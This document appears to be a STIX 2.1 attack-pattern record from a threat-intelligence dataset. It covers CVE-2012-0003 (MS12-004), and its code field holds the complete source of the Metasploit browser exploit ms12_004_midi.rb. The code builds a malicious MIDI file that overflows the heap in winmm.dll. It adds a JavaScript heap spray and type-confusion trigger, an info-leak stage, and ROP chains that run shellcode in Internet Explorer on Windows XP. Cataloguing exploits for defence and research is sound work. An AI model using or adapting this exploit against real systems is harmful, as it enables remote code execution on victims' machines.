{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--67277849-8f9b-4d15-97ae-89995d0cd075",
    "created": "2024-08-14T16:44:27.597376Z",
    "modified": "2024-08-14T16:44:27.59738Z",
    "name": "\"MS12-004 midiOutPlayNextPolyEvent Heap Overflow\"",
    "description": " This module exploits a heap overflow vulnerability in the Windows Multimedia Library (winmm.dll). The vulnerability occurs when parsing specially crafted MIDI files.  Remote code execution can be achieved by using the Windows Media Player ActiveX control.  Exploitation is done by supplying a specially crafted MIDI file with specific events, causing the offset calculation being higher than what is available on the heap (0x400 allocated by WINMM!winmmAlloc), and then allowing us to either \"inc al\" or \"dec al\" a byte.  This can be used to corrupt an array (CImplAry) we setup, and force the browser to confuse types from tagVARIANT objects which leverages remote code execution under the context of the user.  Note: At this time, for IE 8 target, msvcrt ROP is used by default. However if you know your target's patch level, you may also try the 'MSHTML' advanced option for an info leak based attack.  Currently, this module only supports two MSHTML builds: 8.0.6001.18702, which is often seen in a newly installed XP SP3. Or 8.0.6001.19120, which is patch level before the MS12-004 fix.  Also, based on our testing, the vulnerability does not seem to trigger when the victim machine is operated via rdesktop.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms12_004_midi.rb",
            "external_id": "ms12_004_midi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0003"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS12-004 midiOutPlayNextPolyEvent Heap Overflow\",\n      'Description'    => %q{\n          This module exploits a heap overflow vulnerability in the Windows Multimedia\n        Library (winmm.dll). The vulnerability occurs when parsing specially crafted\n        MIDI files.  Remote code execution can be achieved by using the Windows Media Player\n        ActiveX control.\n\n          Exploitation is done by supplying a specially crafted MIDI file with\n        specific events, causing the offset calculation being higher than what is\n        available on the heap (0x400 allocated by WINMM!winmmAlloc), and then allowing\n        us to either \"inc al\" or \"dec al\" a byte.  This can be used to corrupt an array\n        (CImplAry) we setup, and force the browser to confuse types from tagVARIANT objects,\n        which leverages remote code execution under the context of the user.\n\n          Note: At this time, for IE 8 target, msvcrt ROP is used by default. However,\n        if you know your target's patch level, you may also try the 'MSHTML' advanced\n        option for an info leak based attack.  Currently, this module only supports two\n        MSHTML builds: 8.0.6001.18702, which is often seen in a newly installed XP SP3.\n        Or 8.0.6001.19120, which is patch level before the MS12-004 fix.\n\n          Also, based on our testing, the vulnerability does not seem to trigger when\n        the victim machine is operated via rdesktop.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Shane Garrett',  #Initial discovery (IBM X-Force)\n          'juan vazquez',\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          [ 'MSB', 'MS12-004'],\n          [ 'CVE', '2012-0003' ],\n          [ 'OSVDB', '78210'],\n          [ 'BID', '51292']\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'             => \"process\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'IE 6 on Windows XP SP3',\n            {\n              'Rop' => false,\n              'DispatchDst' => 0x0c0c0c0c\n            }\n          ],\n          [\n            'IE 7 on Windows XP SP3',\n            {\n              'Rop' => false,\n              'DispatchDst' => 0x0c0c0c0c\n            }\n          ],\n          [\n            'IE 8 on Windows XP SP3',\n            {\n              # xchg ecx,esp\n              # or byte ptr [eax],al\n              # add byte ptr [edi+5Eh],bl\n              # ret 8\n              # From IMAGEHLP\n              'Rop' => true,\n              'StackPivot'  => 0x76C9B4C2,\n              'DispatchDst' => 0x0c0c1bd0\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-01-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n    register_advanced_options(\n      [\n        OptEnum.new('MSHTML',\n          [\n            false, \"MSHTML Build Version\", '',\n            [\n              '',               #Default (no leaky leaky)\n              '8.0.6001.18702', #newly installed Win XP SP3 non patched\n              '8.0.6001.19120'  #fully patched before KB2598479 - been the same at least since Sep 2011\n            ]\n          ])\n      ])\n  end\n\n  def exploit\n    @m_name, @midi       = get_midi\n    @ml_name, @midi_leak = get_midi(\"leak\")\n    @second_stage_url    = rand_text_alpha(10)\n    @leak_param          = rand_text_alpha(5)\n\n    # Offset to CFunctionPointer vftable in MSHTML\n    case datastore['MSHTML']\n    when '8.0.6001.18702'\n      @offset = 0xbf190\n    when '8.0.6001.19120'\n      @offset = 0xd92c8\n    end\n    super\n  end\n\n  def get_target(request)\n    agent = request.headers['User-Agent']\n    print_status(\"Request as: #{agent}\")\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/\n      #Windows XP SP3 + IE 6.0\n      return targets[1]\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\n      #Windows XP SP3 + IE 7.0\n      return targets[2]\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/\n      #Windows XP SP3 + IE 8.0\n      return targets[3]\n    else\n      return nil\n    end\n  end\n\n  # stage => \"corruption\" (default) | \"leak\"\n  def get_midi(stage=\"corruption\")\n    # MIDI Fileformat Reference:\n    # http://www.sonicspot.com/guide/midifiles.html\n    #\n    # Event Types:\n    # 0x08 = Note Off (when MIDI key is released)\n    # 0x09 = Note On (when MIDI key is pressed)\n    # 0x0A = Note aftertouch (pressure change on the pressed MIDI key)\n    # 0x0B = Controller Event (MIDI channels state)\n    # 0x0C = Program change (Which instrument/patch should be played on the MIDI channel)\n    # 0x0D = Channel aftertouch (similar to Note Aftertouch; effects all keys pressed on the specific MIDI channel)\n    # 0x0E = Pitch Bend (similiar to a controller event; has 2 bytes to describe its value)\n    # 0x0F = Meta Events (not sent or received over a midi port)\n\n    # Structure:\n    # [Header Chunk][Track Chunk][Meta Event][Meta Event][SYSEX Event][Midi Channel Event)\n\n    # Track Chunk Data\n    tc = \"\\x00\\xFF\\x03\\x0D\\x44\\x72\\x75\\x6D\"\n    # Meta Event - Sequence/Track Name\n    tc << \"\\x73\\x20\\x20\\x20\\x28\\x42\\x42\\x29\\x00\"\n    # Midi Channel Event - Program Change\n    tc << \"\\x00\\xC9\\x28\"\n    # Midi Channel Event - Controller\n    tc << \"\\x00\\xB9\\x07\\x64\"\n    # Midi Channel Event - Controller\n    tc << \"\\x00\\xB9\\x0A\\x40\"\n    # Midi Channel Event - Controller\n    tc << \"\\x00\\xB9\\x7B\\x00\"\n    # Midi Channel Event - Controller\n    tc << \"\\x00\\xB9\\x5B\\x28\"\n    # Midi Channel Event - Controller\n    tc << \"\\x00\\xB9\\x5D\\x00\"\n    # Midi Channel Event - Note On\n    tc << \"\\x85\\x50\\x99\\x23\\x7F\"\n\n    # Corruption events\n    if stage == \"corruption\"\n      # Midi Channel Event - Note On\n      tc << \"\\x00\\x9F\\xb2\\x73\"\n    else\n      # Midi Channel Event - Note Off (trigger a leak)\n      tc << \"\\x00\\x8F\\xb2\\x73\"\n    end\n\n    # Meta Event - End Of Track\n    tc << \"\\x00\\xFF\\x2F\\x00\"\n    m = ''\n    # HEADERCHUNK Header\n    m << \"MThd\"                 # Header\n    m << \"\\x00\\x00\\x00\\x06\"     # Chunk size\n    m << \"\\x00\\x00\"             # Format Type\n    m << \"\\x00\\x01\"             # Number of tracks\n    m << \"\\x00\\x60\"             # Time division\n    # TRACKCHUNK header\n    m << \"MTrk\"                 # Header\n    m << [tc.length].pack('N')\n    m << tc\n\n    #midi_name = \"test_case.mid\"\n    midi_name = rand_text_alpha(5) + \".mid\"\n\n    return midi_name, m\n  end\n\n  def on_request_uri(cli, request)\n\n    # Initialize a target.  If none suitable, then we don't continue.\n    my_target = target\n    if my_target.name =~ /Automatic/\n      my_target = get_target(request)\n      agent = request.headers['User-Agent']\n      if my_target.nil? and agent !~ /Windows\\-Media\\-Player|NSPlayer/\n        send_not_found(cli)\n        print_error(\"Unknown user-agent\")\n        return\n      end\n      vprint_status(\"Target selected: #{my_target.name}\") if not my_target.nil?\n    end\n\n    # Send the corrupt midi file to trigger a memory leak, or a crash to that points\n    # to an arbitrary address.\n    if request.uri =~ /#{@ml_name}$/i\n      print_status(\"Testing for info leak...\")\n      send_response(cli, @midi_leak, {'Content-Type'=>'application/octet-strem'})\n      return\n    elsif request.uri =~ /#{@m_name}$/i\n      print_status(\"Sending midi corruption file...\")\n      send_response(cli, @midi, {'Content-Type'=>'application/octet-strem'})\n      return\n    end\n\n    # Send the appropriate stage\n    if datastore['MSHTML'].to_s != '' and my_target['Rop']\n      if request.uri =~ /#{@second_stage_url}/\n        leak = begin\n          request.uri_parts[\"QueryString\"][@leak_param].to_i\n        rescue\n          0\n        end\n        print_status(\"Leaked address: 0x#{leak.to_s(16)}\")\n        send_stage(cli, my_target, 'trigger', leak)\n        return\n      end\n      send_stage(cli, my_target, 'leak')\n    else\n      send_stage(cli, my_target)\n    end\n  end\n\n  def send_stage(cli, my_target, stage='trigger', leak=0)\n    midi_uri = get_resource.chomp(\"/\")\n\n    if stage == 'leak'\n      midi_uri << \"/#{@ml_name}\"\n      trigger = build_trigger(my_target, \"leak\")\n    else\n      midi_uri << \"/#{@m_name}\"\n      trigger  = build_trigger(my_target)\n      spray    = build_spray(my_target, leak)\n    end\n\n    if datastore['OBFUSCATE']\n      spray   = ::Rex::Exploitation::JSObfu.new(spray).obfuscate(memory_sensitive: true)\n      trigger = ::Rex::Exploitation::JSObfu.new(trigger)\n      trigger.obfuscate(memory_sensitive: true)\n      trigger_fn = trigger.sym('trigger')\n    else\n      trigger_fn = 'trigger'\n    end\n\n    html = %Q|\n    <html>\n    <head>\n    <script language='javascript'>\n    #{spray}\n    </script>\n\n    <script language='javascript'>\n      #{trigger}\n    </script>\n    <script for=audio event=PlayStateChange(oldState,newState)>\n      if (oldState == 3 && newState == 0) {\n        #{trigger_fn}();\n      }\n    </script>\n    </head>\n    <body>\n      <object ID=\"audio\" WIDTH=1 HEIGHT=1 CLASSID=\"CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95\">\n        <param name=\"fileName\" value=\"#{midi_uri}\">\n        <param name=\"SendPlayStateChangeEvents\" value=\"true\">\n        <param NAME=\"AutoStart\" value=\"True\">\n        <param name=\"uiMode\" value=\"mini\">\n        <param name=\"Volume\" value=\"-300\">\n      </object>\n    </body>\n    </html>\n    |\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html to #{cli.peerhost}:#{cli.peerport}...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\n\n  def build_spray(my_target, leak=0)\n\n    # Extract string based on target\n    if my_target.name == 'IE 8 on Windows XP SP3'\n      js_extract_str = \"var block = shellcode.substring(2, (0x40000-0x21)/2);\"\n    else\n      js_extract_str = \"var block = shellcode.substring(0, (0x80000-6)/2);\"\n    end\n\n    # Build shellcode based on Rop requirement\n    code = ''\n    if my_target['Rop'] and datastore['MSHTML'].to_s != ''\n      print_status(\"Generating ROP using info-leak: 0x#{leak.to_s(16)}\")\n      code << create_info_leak_rop(my_target, leak)\n      code << payload.encoded\n    elsif my_target['Rop'] and datastore['MSHTML'].to_s == ''\n      print_status(\"Generating ROP using msvcrt\")\n      code << create_rop(my_target, payload.encoded)\n    else\n      code << payload.encoded\n    end\n\n    shellcode = Rex::Text.to_unescape(code)\n\n    randnop = rand_text_alpha(rand(100) + 1)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4)\n\n    # 1. Create  big block of nops\n    # 2. Compose one block which is nops + shellcode\n    # 3. Repeat the block\n    # 4. Extract string from the big block\n    # 5. Spray\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x10000);\n\n    var code = unescape(\"#{shellcode}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x1000) nops+= nops;\n    var shellcode =  nops.substring(0,0x800 - code.length) + code;\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n\n    #{js_extract_str}\n\n    heap_obj.gc();\n    for (var i=0; i < 600; i++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    spray = heaplib(spray, {:noobfu => true})\n    return spray\n  end\n\n  # Build the JavaScript string for the attributes\n  # type => \"corruption\" (default) | \"leak\"\n  def build_element(element_name, my_target, type=\"corruption\")\n    dst = Rex::Text.to_unescape([my_target['DispatchDst']].pack(\"V\"))\n    element = ''\n\n    if my_target.name =~ /IE 8/\n      max   = 63   # Number of attributes for IE 8\n      index = 1    # Where we want to confuse the type\n    else\n      max   = 55   # Number of attributes for before IE 8\n      index = 0    # Where we want to confuse the type\n    end\n\n    element << \"var #{element_name} = document.createElement(\\\"select\\\")\" + \"\\n\"\n\n    # Build attributes\n    0.upto(max) do |i|\n      case type\n        when \"corruption\"\n          obj = (i==index) ? \"unescape(\\\"#{dst}\\\")\" : \"alert\"\n        else #leak\n          obj = \"alert\"\n      end\n      element << \"#{element_name}.w#{i.to_s} = #{obj}\" + \"\\n\"\n    end\n\n    return element\n  end\n\n  # Feng Shui and triggering Steps:\n  # 1. Run the garbage collector before allocations\n  # 2. Defragment the heap and alloc CImplAry objects in one step (objects size are IE version dependent)\n  # 3. Make holes\n  # 4. Let windows media play the crafted midi file and corrupt the heap\n  # 5. Force the using of the confused tagVARIANT.\n  def build_trigger(my_target, type=\"corruption\")\n    js_trigger = build_trigger_fn(my_target, type)\n    select_element = build_element('selob', my_target, type)\n\n    trigger = <<-JS\n      var heap = new heapLib.ie();\n      #{select_element}\n      var clones = new Array(1000);\n\n      function feng_shui() {\n        heap.gc();\n\n        var i = 0;\n        while (i < 1000) {\n          clones[i] = selob.cloneNode(true)\n          i = i + 1;\n        }\n\n        var j = 0;\n        while (j < 1000) {\n          delete clones[j];\n          CollectGarbage();\n          j  = j + 2;\n        }\n      }\n\n      feng_shui();\n\n      #{js_trigger}\n    JS\n\n    trigger = heaplib(trigger, {:noobfu => true})\n    return trigger\n  end\n\n  # type = \"corruption\" (default) | \"leak\"\n  def build_trigger_fn(my_target, type=\"corruption\")\n    js_trigger=\"\"\n    case type\n      when \"corruption\"\n        js_trigger = js_trigger_fn_corruption(my_target)\n      when \"leak\"\n        js_trigger = js_trigger_fn_leak(my_target)\n    end\n    return js_trigger\n  end\n\n  # Redoing the feng shui if fails makes it reliable\n  def js_trigger_fn_corruption(my_target)\n    attribute = (my_target.name == 'IE 8 on Windows XP SP3') ? 'w1' : 'w0'\n\n    js = %Q|\n    function trigger(){\n      var k = 999;\n      while (k > 0) {\n        if (typeof(clones[k].#{attribute}) == \"string\") {\n        } else {\n          clones[k].#{attribute}('come on!');\n        }\n        k = k - 2;\n      }\n      feng_shui();\n      document.audio.Play();\n    }\n    |\n\n    return js\n  end\n\n  # Redoing the feng shui if fails makes it reliable\n  def js_trigger_fn_leak(my_target)\n    js_trigger = \"\"\n    if my_target.name == 'IE 8 on Windows XP SP3'\n      js_trigger = <<-JSTRIGGER\n      function trigger(){\n        var k = 999;\n        while (k > 0) {\n          if (typeof(clones[k].w1) == \"string\") {\n            var leak = clones[k].w1.charCodeAt(1)*0x10000 + clones[k].w1.charCodeAt(0)\n            document.location = \"#{get_resource.chomp(\"/\")}/#{@second_stage_url}\" + \"?#{@leak_param}=\" + leak\n            return;\n          }\n          k = k - 2;\n        }\n        feng_shui();\n        document.audio.Play();\n      }\n      JSTRIGGER\n    end\n\n    return js_trigger\n  end\n\n  def create_rop(t, p)\n    # MSVCRT.dll ROP\n    padding = ''\n    padding << [0x77C4CA70].pack(\"V*\")        #ADD ESP,0C; RET\n    padding << [t['StackPivot']].pack(\"V*\")\n    padding << [0x77C4CA73].pack(\"V*\") * 12   #ROP NOPs\n    generate_rop_payload('msvcrt', p, {'pivot'=>padding, 'target'=>'xp'})\n  end\n\n  def create_info_leak_rop(my_target, leak = 0x0)\n    base = (leak == 0x00) ? 0x63580000 : (leak - @offset)\n    print_status(\"Image base of mshtml: 0x%x\" %base)\n\n    # Generate the gadgets based on offset\n    rop_gadgets = ''\n    case @offset\n    when 0xd92c8\n      rop_gadgets =\n      [\n        :junk,\n        :junk,\n        0x328468,   # push ecx # pop esp # pop edi # pop esi # pop ebp # retn 14\n        :junk,\n        0x247e5d,   # ROP NOPs\n        0x247e5d,\n        0x247e5d,\n        0x247e5d,\n        0x247e5d,\n        0x247e5d,\n        0x247e5d,\n        0x247e5c,   # POP ESI # RETN [mshtml.dll]\n        0x137c,     # ptr to &VirtualProtect() [IAT mshtml.dll]\n        0x3c8db7,   # MOV EDX,DWORD PTR DS:[ESI] # ADD EAX,8BCE8B00 # RETN [mshtml.dll]\n        0x42e239,   # PUSH EDX # XOR EAX,EAX # POP ESI # POP EBP # RETN 0x08 [mshtml.dll]\n        :junk,\n        0x3460c,    # POP EBP # RETN [mshtml.dll]\n        :junk,\n        :junk,\n        0x23ef79,   # & jmp esp [mshtml.dll]\n        0x189303,   # POP EBX # RETN [mshtml.dll]\n        :ebx,       # 0x00000201-> ebx\n        0x20437c,   # POP EDX # RETN [mshtml.dll]\n        :edx,       # 0x00000040-> edx\n        0xc277,     # POP ECX # RETN [mshtml.dll]\n        0x53a47d,   # &Writable location [mshtml.dll]\n        0x4a33e2,   # POP EDI # RETN [mshtml.dll]\n        0x4b601,    # RETN (ROP NOP) [mshtml.dll]\n        0x33fbc6,   # POP EAX # RETN [mshtml.dll]\n        :nop,\n        0x52c718    # PUSHAD # RETN [mshtml.dll]\n      ]\n\n    when 0xbf190\n      rop_gadgets =\n      [\n        :junk,\n        0x3338ae,  # push ecx # pop esp # pop edi # pop esi # pop ebp # retn 14\n        :junk,\n        0xe9e7,    # POP ECX # RETN [mshtml.dll] 0x6358e9e7\n        :junk,\n        :junk,\n        :junk,\n        :junk,\n        :junk,\n        0x1318,     # ptr to &VirtualProtect() [IAT mshtml.dll]\n        0x48b440,   # MOV EDX,DWORD PTR DS:[ECX] # RETN [mshtml.dll]\n        0x3dc745,   # POP ESI # RETN [mshtml.dll]\n        :neg,       # 0xffffffff\n        0x2fb18b,   # INC ESI # RETN [mshtml.dll]\n        0x35190d,   # ADC ESI,EDX # DEC ECX # RETN 08 [mshtml.dll]\n        0x4aada7,   #  POP EBP # RETN [mshtml.dll]\n        :junk,      # Compensates RETN\n        :junk,      # Compensates RETN\n        0x1ffc54,   # & jmp esp [mshtml.dll]\n        0x4498a7,   # POP EBX # RETN [mshtml.dll]\n        :ebx,       # 0x00000800: 0x00000201-> ebx\n        0x24cce4,   # POP EDX # RETN [mshtml.dll]\n        :edx,       # 0x00000040-> edx\n        0x158306,   # POP ECX # RETN [mshtml.dll]\n        0x535098,   # &Writable location [mshtml.dll]\n        0x1cf217,   # POP EDI # RETN [mshtml.dll]\n        0xa0001,    # RETN (ROP NOP) [mshtml.dll]\n        0x349f9b,   # POP EAX # RETN [mshtml.dll]\n        :nop,\n        0x2afbe8    # PUSHAD # RETN [mshtml.dll]\n      ]\n    end\n\n    nops = make_nops(4).unpack(\"L\")[0].to_i\n\n    rop_gadgets.map! { |e|\n      if e == :junk\n        rand_text(4).unpack(\"L\")[0].to_i\n      elsif e == :neg\n        0xffffffff\n      elsif e == :ebx\n        0x00000800\n      elsif e == :edx\n        0x00000040\n      elsif e == :nop\n        nops\n      else\n        base + e\n      end\n    }\n\n    chain = rop_gadgets.pack('V*')\n    return chain\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-10",
    "x_mitre_platforms": [
        "win'"
    ]
}